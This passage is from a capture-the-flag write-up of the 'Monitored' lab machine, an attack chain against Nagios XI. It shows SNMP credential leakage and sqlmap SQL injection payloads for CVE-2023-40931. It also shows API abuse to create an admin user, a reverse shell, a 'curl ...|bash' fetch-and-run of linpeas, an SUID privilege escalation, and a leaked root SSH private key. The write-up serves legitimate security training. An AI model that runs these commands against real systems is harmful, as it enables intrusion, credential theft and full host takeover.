  772                   runnable              sshd                  sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
  801                   runnable              shellinaboxd          /usr/bin/shellinaboxd  -q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit
  802                   runnable              shellinaboxd          /usr/bin/shellinaboxd  -q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit
  833                   runnable              agetty                /sbin/agetty          -o -p -- \u --noclear tty1 linux
  842                   runnable              postgres              /usr/lib/postgresql/13/bin/postgres  -D /var/lib/postgresql/13/main -c config_file=/etc/postgresql/13/main/postgresql.conf
  846                   runnable              slapd                 /usr/sbin/slapd       -h ldap:/// ldapi:/// -g openldap -u openldap -F /etc/ldap/slapd.d
  868                   runnable              apache2               /usr/sbin/apache2     -k start
  871                   runnable              postgres              postgres: 13/main: checkpointer
  872                   runnable              postgres              postgres: 13/main: background writer
  873                   runnable              postgres              postgres: 13/main: walwriter
  874                   runnable              postgres              postgres: 13/main: autovacuum launcher
  875                   runnable              postgres              postgres: 13/main: stats collector
  876                   runnable              postgres              postgres: 13/main: logical replication launcher
  936                   runnable              mariadbd              /usr/sbin/mariadbd
  940                   runnable              snmptt                /usr/bin/perl         /usr/sbin/snmptt --daemon
  941                   runnable              snmptt                /usr/bin/perl         /usr/sbin/snmptt --daemon
  974                   runnable              nagios                /usr/local/nagios/bin/nagios  -d /usr/local/nagios/etc/nagios.cfg
  976                   runnable              nagios                /usr/local/nagios/bin/nagios  --worker /usr/local/nagios/var/rw/nagios.qh
  977                   runnable              nagios                /usr/local/nagios/bin/nagios  --worker /usr/local/nagios/var/rw/nagios.qh
  978                   runnable              nagios                /usr/local/nagios/bin/nagios  --worker /usr/local/nagios/var/rw/nagios.qh
  979                   runnable              nagios                /usr/local/nagios/bin/nagios  --worker /usr/local/nagios/var/rw/nagios.qh
  992                   runnable              xinetd                /usr/sbin/xinetd      -pidfile /run/xinetd.pid -stayalive -inetd_compat -inetd_ipv6
  1364                  runnable              nagios                /usr/local/nagios/bin/nagios  -d /usr/local/nagios/etc/nagios.cfg
  1377                  runnable              sudo                  sudo                  -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB
  1378                  runnable              bash                  /bin/bash             -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB
  1414                  runnable              exim4                 /usr/sbin/exim4       -bd -q30m
  4138                  unknown               kworker/0:0-cgroup_destroy
  4763                  unknown               kworker/0:1-mm_percpu_wq
  5588                  unknown               kworker/u4:0-ext4-rsv-conversion
  5879                  unknown               kworker/u4:1-ext4-rsv-conversion
  6760                  unknown               kworker/1:2-events
  7149                  runnable              apache2               /usr/sbin/apache2     -k start
  7234                  unknown               kworker/u4:2-flush-8:0
  7273                  runnable              apache2               /usr/sbin/apache2     -k start
  7352                  runnable              apache2               /usr/sbin/apache2     -k start
  7442                  runnable              apache2               /usr/sbin/apache2     -k start
  8054                  runnable              apache2               /usr/sbin/apache2     -k start
  8141                  runnable              apache2               /usr/sbin/apache2     -k start
  8183                  runnable              apache2               /usr/sbin/apache2     -k start
  8484                  runnable              apache2               /usr/sbin/apache2     -k start
  8490                  runnable              apache2               /usr/sbin/apache2     -k start
  8492                  runnable              apache2               /usr/sbin/apache2     -k start
  8501                  runnable              apache2               /usr/sbin/apache2     -k start
  8522                  runnable              apache2               /usr/sbin/apache2     -k start
  8603                  unknown               kworker/1:0-events
  8783                  runnable              apache2               /usr/sbin/apache2     -k start
  8891                  unknown               kworker/0:2-events
  8895                  runnable              apache2               /usr/sbin/apache2     -k start
  8928                  runnable              apache2               /usr/sbin/apache2     -k start
  8969                  runnable              apache2               /usr/sbin/apache2     -k start
  9027                  runnable              apache2               /usr/sbin/apache2     -k start
  9073                  runnable              apache2               /usr/sbin/apache2     -k start
  9074                  runnable              apache2               /usr/sbin/apache2     -k start
  9126                  runnable              cron                  /usr/sbin/CRON        -f
  9129                  runnable              sh                    /bin/sh               -c /usr/bin/php -q /usr/local/nagiosxi/cron/cmdsubsys.php >> /usr/local/nagiosxi/var/cmdsubsys.log 2>&1
  9130                  runnable              php                   /usr/bin/php          -q /usr/local/nagiosxi/cron/cmdsubsys.php
  9138                  runnable              apache2               /usr/sbin/apache2     -k start
  9155                  runnable              sleep                 sleep                 60

[*] Storage information:

  Description                   : ["Physical memory"]
  Device id                     : [#<SNMP::Integer:0x00007f7806cba950 @value=1>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x00007f7806cb8da8 @value=1024>]
  Memory size                   : 3.83 GB
  Memory used                   : 1.05 GB

  Description                   : ["Virtual memory"]
  Device id                     : [#<SNMP::Integer:0x00007f7806cb3ec0 @value=3>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x00007f7806cb2318 @value=1024>]
  Memory size                   : 4.78 GB
  Memory used                   : 1.05 GB

  Description                   : ["Memory buffers"]
  Device id                     : [#<SNMP::Integer:0x00007f7806fe47e8 @value=6>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x00007f7806fefc60 @value=1024>]
  Memory size                   : 3.83 GB
  Memory used                   : 45.90 MB

  Description                   : ["Cached memory"]
  Device id                     : [#<SNMP::Integer:0x00007f7807005100 @value=7>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x00007f780700ee80 @value=1024>]
  Memory size                   : 632.48 MB
  Memory used                   : 632.48 MB

  Description                   : ["Shared memory"]
  Device id                     : [#<SNMP::Integer:0x00007f7807032a88 @value=8>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x00007f780703cfd8 @value=1024>]
  Memory size                   : 28.30 MB
  Memory used                   : 28.30 MB

  Description                   : ["Swap space"]
  Device id                     : [#<SNMP::Integer:0x00007f7806d32608 @value=10>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x00007f7806d30a60 @value=1024>]
  Memory size                   : 975.00 MB
  Memory used                   : 0 bytes

  Description                   : ["/run"]
  Device id                     : [#<SNMP::Integer:0x00007f7806d3bc08 @value=35>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x00007f7806d39f98 @value=4096>]
  Memory size                   : 391.95 MB
  Memory used                   : 708.00 KB

  Description                   : ["/"]
  Device id                     : [#<SNMP::Integer:0x00007f7806fca9d8 @value=36>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x00007f7806fccc38 @value=4096>]
  Memory size                   : 6.80 GB
  Memory used                   : 4.39 GB

  Description                   : ["/dev/shm"]
  Device id                     : [#<SNMP::Integer:0x00007f7806fd95c8 @value=38>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x00007f7806d1b638 @value=4096>]
  Memory size                   : 1.91 GB
  Memory used                   : 16.00 KB

  Description                   : ["/run/lock"]
  Device id                     : [#<SNMP::Integer:0x00007f7806d1e798 @value=39>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x00007f7806d1cbf0 @value=4096>]
  Memory size                   : 5.00 MB
  Memory used                   : 0 bytes


[*] Device information:

  Id                    Type                  Status                Descr
  196608                unknown               running               AuthenticAMD: AMD EPYC 7302P 16-Core Processor
  196609                unknown               running               AuthenticAMD: AMD EPYC 7302P 16-Core Processor
  262145                unknown               running               network interface lo
  262146                unknown               running               network interface eth0
  786432                unknown               unknown               Guessing that there's a floating point co-processor

[*] Software components:

  Index                 Name
  1                     adduser_3.118+deb11u1_all
  2                     alsa-topology-conf_1.2.4-1_all
  3                     alsa-ucm-conf_1.2.4-2_all
[...]
  826                   zlib1g-dev_1:1.2.11.dfsg-2+deb11u2_amd64
```

# User Flag
---

## Shell as nagios


### Credential in process list from SNMP

A pair of credential can be found from **nmap** and **snmp-check** scan

```bash
  1378                  runnable              bash                  /bin/bash             -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB
```

> https://nagios.monitored.htb/nagiosxi/login.php

It returned `The specified user account has been disabled or does not exist.`

![](/assets/obsidian/5098f91c39893bab4986346879e06a6e.png)

But while entering a wrong password, it returned `Invalid username or password.`. So the user exists but was disabled

![](/assets/obsidian/9a3c83c274c4e9f5ae26a3fae5c40f51.png)

### Login to Nagios Core 4.4.13

The credential worked at https://nagios.monitored.htb/nagios

![](/assets/obsidian/a43653ab5407c5937f86ea3230135922.png)

![](/assets/obsidian/2042c1200ad9520196cfbe9496215131.png)

By logging in, it reveals the version `Nagios Core 4.4.13`

> **Nagios XI** is a solution to monitor and manage devices through SNMP

![](/assets/obsidian/65ac615b9ca1b11bb10ea07da773da95.png)


### SQLI (Authenticated) (CVE-2023-40931)

I didn't find any vuln fixes after `Nagios core 4.4.13`

Google : `Nagios core 4.4.13`

> https://www.nagios.org/projects/nagios-core/4x/

It was released at `2023-06-01`

![](/assets/obsidian/a5acb418051c3af3b882f544845d63ad.png)

By looking at **nagios** changelog, we can see `Nagios core 4.4.13` was released with `Nagios XI 5.11.0`

> https://www.nagios.com/changelog/

![](/assets/obsidian/b8899b601af846cee06df6536a7d7fb1.png)

Google : `nagios XI 5.11 exploit`

> https://www.tenable.com/plugins/nessus/181758

![](/assets/obsidian/a5ec2a0a33e71af0ea2d6ceef520ce77.png)

Google : `CVE-2023-40931`

> https://outpost24.com/blog/nagios-xi-vulnerabilities/

![](/assets/obsidian/ddd6b00d5e8fe13c7d34024ea6ca8dd1.png)

I've tried to send a request, but it returns `Your session has timed out`

![](/assets/obsidian/3fd14412f82091a041a4b59e86dcbfce.png)

Search `banner_message-ajaxhelper.php` on github

There's a repo for that

![](/assets/obsidian/d86946658b5e0ddc1019c887323de041.png)

The value of `action` parameter : `acknowledge banner message` should be in the format of underlines : `acknowledge_banner_message`

![](/assets/obsidian/0699efcbdb3ddd6672c8468d1fea5990.png)

It checks for session of `user_id`

![](/assets/obsidian/810d07ca52c171954570f9a885c4c82e.png)

Search `Your session has timed out` in the repo. 

Turns out that instead of returning `You are not authenticated`, it just returns `Your session has timed out`

![](/assets/obsidian/176b225f41948b85a50748abd85628bf.png)


### Setup nagios XI 5.11 on VM

Used my ubuntu VM and followed the installation manual

> https://assets.nagios.com/downloads/nagiosxi/docs/Installing-Nagios-XI-Manually-on-Linux.pdf

```bash
cd /tmp
wget https://assets.nagios.com/downloads/nagiosxi/5/xi-5.11.0.tar.gz
tar xzf xi-5.11.0.tar.gz
cd nagiosxi
./fullinstall
```

![](/assets/obsidian/ef2ddbf6e68ec4024ff997728f4e5c06.png)

After that, I'm was able to access `nagios XI 5.11.0` on my LAB

![](/assets/obsidian/97e3217ac450e7f33180c42ec3da1178.png)


### Nagios XI 5.11.0 to RCE

#### Use API to create token for disabled service account

By looking at the developer's API doc, it shows how to create and use **Auth Tokens**

> http://10.0.2.4/nagiosxi/

![](/assets/obsidian/84189e3f583eef02929f6a58e7fdf605.png)

![](/assets/obsidian/befa40b3118b1819c6ec87350f369591.png)

![](/assets/obsidian/72aaedffa7acad1ee3ea97a14a50b039.png)

I can create an auth token for `svc`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Monitored]
└─$ curl -XPOST "http://monitored.htb/nagiosxi/api/v1/authenticate?pretty=1" -d "username=svc&password=XjH7VCehowpR1xZB&valid_min=600"
{
    "username": "svc",
    "user_id": "2",
    "auth_token": "4ee242d66d5aed509f531e15f0617f02b0d6301f",
    "valid_min": 600,
    "valid_until": "Wed, 17 Jan 2024 13:55:26 -0500"
}
```

Then login to get a cookie

```bash
┌──(bravosec㉿fsociety)-[~/htb/Monitored]
└─$ curl -k 'https://monitored.htb/nagiosxi/login.php?token=4ee242d66d5aed509f531e15f0617f02b0d6301f' -v -s 2>&1 | grep 'Set-Cookie:'
< Set-Cookie: nagiosxi=b9b2p2evvnj3q9neoigtthqs4n; expires=Wed, 17-Jan-2024 09:26:41 GMT; Max-Age=1800; path=/; secure; HttpOnly
< Set-Cookie: nagiosxi=b9b2p2evvnj3q9neoigtthqs4n; expires=Wed, 17-Jan-2024 09:26:41 GMT; Max-Age=1800; path=/; secure; HttpOnly
```


#### SQL Injection in Banner acknowledging endpoint (CVE-2023-40931)

Since the cookie will expire quickly, I made a script for **sqlmap**

```bash
export TOKEN=$(curl -XPOST "http://monitored.htb/nagiosxi/api/v1/authenticate?pretty=1" -d "username=svc&password=XjH7VCehowpR1xZB&valid_min=600" -s | jq .auth_token -r)
export COOKIE=$(curl -k "https://monitored.htb/nagiosxi/login.php?token=${TOKEN}" -v -s 2>&1 | grep 'Set-Cookie:' | head -n1 | awk -F ': |;' '{print $2}')
sqlmap -u 'https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3' --cookie "${COOKIE}" -t 10 -p id --os linux --dbms mysql --batch
```

```bash
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: action=acknowledge_banner_message&id=(SELECT (CASE WHEN (6017=6017) THEN 3 ELSE (SELECT 5638 UNION SELECT 4835) END))

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: action=acknowledge_banner_message&id=3 OR (SELECT 3051 FROM(SELECT COUNT(*),CONCAT(0x7170627a71,(SELECT (ELT(3051=3051,1))),0x7162707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=acknowledge_banner_message&id=3 AND (SELECT 6827 FROM (SELECT(SLEEP(5)))jaLm)
---
[17:17:28] [INFO] testing MySQL
[17:17:28] [INFO] confirming MySQL
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
[17:17:29] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.56
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
```

Start enumerating database

```bash
sqlmap -u 'https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3' --cookie "${COOKIE}" -t 10 -p id --os linux --dbms mysql --batch --dbs
```

```bash
available databases [2]:
[*] information_schema
[*] nagiosxi
```

```bash
sqlmap -u 'https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3' --cookie "${COOKIE}" -t 10 -p id --os linux --dbms mysql --batch -D nagiosxi --tables
```

```bash
Database: nagiosxi
[22 tables]
+-----------------------------+
| xi_auditlog                 |
| xi_auth_tokens              |
| xi_banner_messages          |
| xi_cmp_ccm_backups          |
| xi_cmp_favorites            |
| xi_cmp_nagiosbpi_backups    |
| xi_cmp_scheduledreports_log |
| xi_cmp_trapdata             |
| xi_cmp_trapdata_log         |
| xi_commands                 |
| xi_deploy_agents            |
| xi_deploy_jobs              |
| xi_eventqueue               |
| xi_events                   |
| xi_link_users_messages      |
| xi_meta                     |
| xi_mibs                     |
| xi_options                  |
| xi_sessions                 |
| xi_sysstat                  |
| xi_usermeta                 |
| xi_users                    |
+-----------------------------+
```

```bash
sqlmap -u 'https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3' --cookie "${COOKIE}" -t 10 -p id --os linux --dbms mysql --batch -D nagiosxi -T xi_users --dump
```

```bash
Database: nagiosxi
Table: xi_users
[2 entries]
+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
| user_id | email               | name                 | api_key                                                          | enabled | password                                                     | username    | created_by | last_login | api_enabled | last_edited | created_time | last_attempt | backend_ticket                                                   | last_edited_by | login_attempts | last_password_change |
+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
| 1       | admin@monitored.htb | Nagios Administrator | IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL | 1       | $2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C | nagiosadmin | 0          | 1701931372 | 1           | 1701427555  | 0            | 0            | IoAaeXNLvtDkH5PaGqV2XZ3vMZJLMDR0                                 | 5              | 0              | 1701427555           |
| 2       | svc@monitored.htb   | svc                  | 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK | 0       | $2a$10$12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK | svc         | 1          | 1699724476 | 1           | 1699728200  | 1699634403   | 1699730174   | 6oWBPbarHY4vejimmu3K8tpZBNrdHpDgdUEs5P2PFZYpXSuIdrRMYgk66A0cjNjq | 1              | 3              | 1699697433           |
+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
```

Cracking `bcrypt` is not a good idea, I can use `admin`'s API key instead

```bash
┌──(bravosec㉿fsociety)-[~/htb/Monitored]
└─$ nth -t '$2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C'

  _   _                           _____ _           _          _   _           _
 | \ | |                         |_   _| |         | |        | | | |         | |
 |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__
 | . ` |/ _` | '_ ` _ \ / _ \______| | | '_ \ / _` | __|______|  _  |/ _` / __| '_ \
 | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |
 \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|

https://twitter.com/bee_sec_san
https://github.com/HashPals/Name-That-Hash


$2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C

Most Likely
bcrypt, HC: 3200 JtR: bcrypt
Blowfish(OpenBSD), HC: 3200 JtR: bcrypt Summary: Can be used in Linux Shadow Files.
Woltlab Burning Board 4.x,
```


#### Add a new admin user via API key

> http://10.0.2.4/nagiosxi/help/api-system-reference.php#add-user

![](/assets/obsidian/04735aad38d5e5cdc277f02c98de244d.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Monitored]
└─$ curl -k -XPOST "https://monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d 'username=x&password=x&name=x&email=x@x.com&auth_level=admin'
{
    "success": "User account x was added successfully!",
    "user_id": 6
}
```

#### Admin panel to RCE

After login, the version `Nagios XI 5.11.0` was revealed

![](/assets/obsidian/15714818256bbaa4c7fbf1ca25837bad.png)

There's a general way to achieve command execution after getting admin access

Create a reverse shell command :

- Configure -> Core config manager -> Add command -> Put reverse shell -> Apply Configuration

> Double quotes need to be escaped, use single quotes to evade the issue
{: .prompt-info }

![](/assets/obsidian/e709dd74b97e19b017048731312f3d6f.png)

Run check script

- Configure -> Core config manager -> Monitoring -> Hosts -> Edit `localhost` -> Set `Check command` -> Run Check Command

![](/assets/obsidian/934d2640ea5ac26f1aa34435899fb069.png)

![](/assets/obsidian/bb1ddbaf0a58c948f861c624c957726a.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Monitored]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.21] from (UNKNOWN) [10.129.62.157] 46884
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
nagios@monitored:~$ ^Z
zsh: suspended  nc -lvnp 1111

stty raw -echo;fg
export TERM=xterm
stty rows 50 columns 209
┌──(bravosec㉿fsociety)-[~/htb/Monitored]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111
                               export TERM=xterm
nagios@monitored:~$ stty rows 50 columns 209
nagios@monitored:~$ id
uid=1001(nagios) gid=1001(nagios) groups=1001(nagios),1002(nagcmd)
nagios@monitored:~$ cat ~/user.txt
e171d8ff6112102a59547b421b7862c1
```


# Root Flag
---

## From nagios to root


### Enumeration

Run `linpeas` in background while manually enumerating

```bash
echo 'curl 10.10.14.21/linpeas.sh|bash' | nc -lvnp 1111 | tee -a linpeas.txt
```

```bash
nagios@monitored:~$ cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
svc:x:1000:1000:svc,,,:/home/svc:/bin/bash
postgres:x:109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
nagios:x:1001:1001::/home/nagios:/bin/bash
```

```bash
nagios@monitored:~$ sudo -l
Matching Defaults entries for nagios on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nagios may run the following commands on localhost:
    (root) NOPASSWD: /etc/init.d/nagios start
    (root) NOPASSWD: /etc/init.d/nagios stop
    (root) NOPASSWD: /etc/init.d/nagios restart
    (root) NOPASSWD: /etc/init.d/nagios reload
    (root) NOPASSWD: /etc/init.d/nagios status
    (root) NOPASSWD: /etc/init.d/nagios checkconfig
    (root) NOPASSWD: /etc/init.d/npcd start
    (root) NOPASSWD: /etc/init.d/npcd stop
    (root) NOPASSWD: /etc/init.d/npcd restart
    (root) NOPASSWD: /etc/init.d/npcd reload
    (root) NOPASSWD: /etc/init.d/npcd status
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/migrate/migrate.php *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
```

`Linpeas` shows that we can edit `/usr/local/nagios/bin/npcd` binary for the service `npcd.service`

![](/assets/obsidian/50b58c9138f462f6e292b247078547c0.png)

And we can also restart services by using `/usr/local/nagiosxi/scripts/manage_services.sh`

```bash
nagios@monitored:~$ cat /usr/local/nagiosxi/scripts/manage_services.sh|grep '# Ubuntu / Debian' -A50

# Ubuntu / Debian

if [ "$distro" == "Debian" ] || [ "$distro" == "Ubuntu" ]; then
    # Adjust the shellinabox service, no trailing 'd' in Debian/Ubuntu
    if [ "$service" == "shellinaboxd" ]; then
        service="shellinabox"
    fi

    if [ `command -v systemctl` ]; then
        `which systemctl` --no-pager "$action" "$service" $args
        return_code=$?
    else
        `which service` "$service" "$action"
        return_code=$?
    fi
fi


# Others?

exit $return_code
nagios@monitored:~$
```

### Writeable service binary + SUDO restart service

Give bash SUID as root

```bash
nagios@monitored:~$ cp /bin/bash /tmp/b
nagios@monitored:~$ sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd
nagios@monitored:~$ echo -e '#!/bin/bash\nchown root /tmp/b; chmod u+s /tmp/b' > /usr/local/nagios/bin/npcd
nagios@monitored:~$ sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd
nagios@monitored:~$ /tmp/b -p
b-5.1# id
uid=1001(nagios) gid=1001(nagios) euid=0(root) groups=1001(nagios),1002(nagcmd)
b-5.1# cat /root/root.txt
d5f7fad221ea7d5fcfd9505fd406d451
b-5.1#
```

# Additional
---

## From nagios to root with get_profile.sh

The script will grab some data into a zip file

```bash
nagios@monitored:~$ cat /usr/local/nagiosxi/scripts/components/getprofile.sh
[...]
echo "Creating nagios.txt..."
nagios_log_file=$(cat /usr/local/nagios/etc/nagios.cfg | sed -n -e 's/^log_file=//p' | sed 's/\r$//')
tail -n500 "$nagios_log_file" &> "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/nagios.txt"
[...]
echo "Zipping logs directory..."


## temporarily change to that directory, zip, then leave
(
    ts=$(date +%s)
    cd /usr/local/nagiosxi/var/components/profile
    mv "$folder" "profile-$ts"
    zip -r profile.zip "profile-$ts"
    rm -rf "profile-$ts"
    mv -f profile.zip ../
)
```

We can control `/usr/local/nagios/etc/nagios.cfg`

```bash
nagios@monitored:~$ ls -la /usr/local/nagios/etc/nagios.cfg
-rw-rw-r-- 1 www-data nagios 5874 Jan 17 06:36 /usr/local/nagios/etc/nagios.cfg
```

```bash
nagios@monitored:~$ cat /usr/local/nagios/etc/nagios.cfg | sed -n -e 's/^log_file=//p' | sed 's/\r$//'
/usr/local/nagios/var/nagios.log
```

Replace the file to `tail` with root's ssh key

```bash
nagios@monitored:~$ sed -i 's/\/usr\/local\/nagios\/var\/nagios.log/\/root\/.ssh\/id_rsa/' /usr/local/nagios/etc/nagios.cfg
```

```bash
nagios@monitored:~$ sudo /usr/local/nagiosxi/scripts/components/getprofile.sh x
mv: cannot stat '/usr/local/nagiosxi/tmp/profile-x.html': No such file or directory
-------------------Fetching Information-------------------
Please wait.......
Creating system information.
[...]
Backup and Zip complete!
```

```bash
nagios@monitored:/tmp$ unzip /usr/local/nagiosxi/var/components/profile.zip
nagios@monitored:/tmp$ cat profile-1705495756/nagios-logs/nagios.txt
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAnZYnlG22OdnxaaK98DJMc9isuSgg9wtjC0r1iTzlSRVhNALtSd2C
FSINj1byqeOkrieC8Ftrte+9eTrvfk7Kpa8WH0S0LsotASTXjj4QCuOcmgq9Im5SDhVG7/
z9aEwa3bo8u45+7b+zSDKIolVkGogA6b2wde5E3wkHHDUXfbpwQKpURp9oAEHfUGSDJp6V
bok57e6nS9w4mj24R4ujg48NXzMyY88uhj3HwDxi097dMcN8WvIVzc+/kDPUAPm+l/8w89
9MxTIZrV6uv4/iJyPiK1LtHPfhRuFI3xe6Sfy7//UxGZmshi23mvavPZ6Zq0qIOmvNTu17
V5wg5aAITUJ0VY9xuIhtwIAFSfgGAF4MF/P+zFYQkYLOqyVm++2hZbSLRwMymJ5iSmIo4p
lbxPjGZTWJ7O/pnXzc5h83N2FSG0+S4SmmtzPfGntxciv2j+F7ToMfMTd7Np9/lJv3Yb8J
/mxP2qnDTaI5QjZmyRJU3bk4qk9shTnOpXYGn0/hAAAFiJ4coHueHKB7AAAAB3NzaC1yc2
EAAAGBAJ2WJ5RttjnZ8WmivfAyTHPYrLkoIPcLYwtK9Yk85UkVYTQC7UndghUiDY9W8qnj
pK4ngvBba7XvvXk6735OyqWvFh9EtC7KLQEk144+EArjnJoKvSJuUg4VRu/8/WhMGt26PL
uOfu2/s0gyiKJVZBqIAOm9sHXuRN8JBxw1F326cECqVEafaABB31BkgyaelW6JOe3up0vc
OJo9uEeLo4OPDV8zMmPPLoY9x8A8YtPe3THDfFryFc3Pv5Az1AD5vpf/MPPfTMUyGa1err
+P4icj4itS7Rz34UbhSN8Xukn8u//1MRmZrIYtt5r2rz2ematKiDprzU7te1ecIOWgCE1C
dFWPcbiIbcCABUn4BgBeDBfz/sxWEJGCzqslZvvtoWW0i0cDMpieYkpiKOKZW8T4xmU1ie
zv6Z183OYfNzdhUhtPkuEpprcz3xp7cXIr9o/he06DHzE3ezaff5Sb92G/Cf5sT9qpw02i
OUI2ZskSVN25OKpPbIU5zqV2Bp9P4QAAAAMBAAEAAAGAWkfuAQEhxt7viZ9sxbFrT2sw+R
reV+o0IgIdzTQP/+C5wXxzyT+YCNdrgVVEzMPYUtXcFCur952TpWJ4Vpp5SpaWS++mcq/t
PJyIybsQocxoqW/Bj3o4lEzoSRFddGU1dxX9OU6XtUmAQrqAwM+++9wy+bZs5ANPfZ/EbQ
qVnLg1Gzb59UPZ51vVvk73PCbaYWtIvuFdAv71hpgZfROo5/QKqyG/mqLVep7mU2HFFLC3
dI0UL15F05VToB+xM6Xf/zcejtz/huui5ObwKMnvYzJAe7ViyiodtQe5L2gAfXxgzS0kpT
/qrvvTewkKNIQkUmCRvBu/vfaUhfO2+GceGB3wN2T8S1DhSYf5ViIIcVIn8JGjw1Ynr/zf
FxsZJxc4eKwyvYUJ5fVJZWSyClCzXjZIMYxAvrXSqynQHyBic79BQEBwe1Js6OYr+77AzW
8oC9OPid/Er9bTQcTUbfME9Pjk9DVU/HyT1s2XH9vnw2vZGKHdrC6wwWQjesvjJL4pAAAA
wQCEYLJWfBwUhZISUc8IDmfn06Z7sugeX7Ajj4Z/C9Jwt0xMNKdrndVEXBgkxBLcqGmcx7
RXsFyepy8HgiXLML1YsjVMgFjibWEXrvniDxy2USn6elG/e3LPok7QBql9RtJOMBOHDGzk
ENyOMyMwH6hSCJtVkKnUxt0pWtR3anRe42GRFzOAzHmMpqby1+D3GdilYRcLG7h1b7aTaU
BKFb4vaeUaTA0164Wn53N89GQ+VZmllkkLHN1KVlQfszL3FrYAAADBAMuUrIoF7WY55ier
